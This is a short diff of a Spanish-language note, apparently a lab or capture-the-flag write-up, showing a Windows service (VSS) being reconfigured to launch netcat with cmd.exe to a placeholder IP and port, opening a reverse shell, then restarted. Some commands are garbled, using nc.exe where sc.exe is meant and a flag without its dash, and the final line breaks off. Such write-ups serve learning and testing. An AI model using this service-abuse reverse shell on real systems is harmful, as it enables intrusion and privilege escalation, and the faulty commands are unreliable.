@@ -132,12 +132,14 @@ podemos modificar uno de estos servicios para que ejecute el netcat y de esa man
 
 vamos a modificar el sevicio VSS este permite facilitar la creación de copias de seguridad de volúmenes de disco mientras los archivos están en uso
 ```python
-sc.exe config vss binPath="C:\Users\svc printer\Documentos\nc.exe e cmd.exe IP Puerto
+	sc.exe config vss binPath="C:\Users\svc printer\Documentos\nc.exe e cmd.exe IP Puerto
+	
+	nc.exe stop vss
+	
+	nc.exe start vss
 ```
-
 ![[Pasted image 20240310191527.png]]
-
-
+estaremos a la esci
 
 
 
